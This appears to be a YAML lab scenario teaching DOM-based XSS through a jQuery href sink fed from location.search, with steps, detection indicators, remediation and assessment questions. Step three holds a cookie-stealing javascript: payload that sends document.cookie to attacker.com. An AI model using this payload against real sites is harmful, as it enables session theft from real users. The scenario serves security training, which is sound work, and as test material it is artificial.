# Category: Cross-Site Scripting (XSS)
name: "DOM XSS in jQuery anchor href attribute sink using location.search source"
id: "xss-dom-jquery-href-001"
category: "xss"
subcategory: "dom_based"
difficulty: "apprentice"
estimated_time: "30 minutes"

description: |
  This scenario covers DOM-based XSS where jQuery is used to set the
  `href` attribute of an anchor tag with data from `location.search`.
  The attacker can inject a JavaScript URL (`javascript:alert(1)`) that
  executes when the link is clicked.

learning_objectives:
  - Understand jQuery's role in DOM manipulation
  - Identify vulnerable `.attr('href', ...)` calls
  - Exploit by injecting a `javascript:` URL

tools:
  - Burp Suite
  - Browser developer tools

prerequisites:
  - Basic understanding of jQuery and DOM
  - Access to a vulnerable web application or lab

steps:
  - id: "step1"
    phase: "reconnaissance"
    action: "Find jQuery code that sets href with user input"
    commands:
      - "# Look for `$('a').attr('href', location.search.substring(...))`"
    expected_output: "Vulnerable code identified"
    detection: "None"

  - id: "step2"
    phase: "exploitation"
    action: "Inject a javascript: URL"
    commands:
      - "# Example: http://example.com/page?param=javascript:alert('XSS')"
      - "# Then click the generated link"
    expected_output: "JavaScript executes when link is clicked"
    detection: "Web server logs may show unusual parameters"

  - id: "step3"
    phase: "post_exploitation"
    action: "Perform actions in context of victim"
    commands:
      - "# Payload: javascript:document.location='http://attacker.com/steal?cookie='+document.cookie"
    expected_output: "Cookie exfiltrated"
    detection: "Attacker server logs"

compliance_controls:
  - standard: "MITRE ATT&CK"
    control: "T1189"
    description: "Drive-by Compromise"
  - standard: "OWASP"
    control: "A03:2021"
    description: "Injection"

detection:
  network_indicators:
    - "URLs with javascript: scheme"
  log_indicators:
    - "Web server logs with suspicious parameters"
  endpoint_indicators:
    - "None"

remediation:
  immediate:
    - "Validate and sanitize input for href attributes"
    - "Use `setAttribute` with proper encoding"
  long_term:
    - "Use a whitelist of allowed protocols (http, https, mailto)"
    - "Implement CSP to block unsafe-inline"

variables:
  target_url: "http://example.com/page?param=PAYLOAD"

assessment_questions:
  - "What is a `javascript:` URL and why is it dangerous?"
  - "How can you prevent injection into href attributes?"
  - "What is the difference between jQuery `.attr()` and `.prop()`?"

references:
  - url: "https://owasp.org/www-community/attacks/DOM_Based_XSS"
    title: "OWASP DOM XSS"
  - url: "https://api.jquery.com/attr/"
    title: "jQuery .attr() documentation"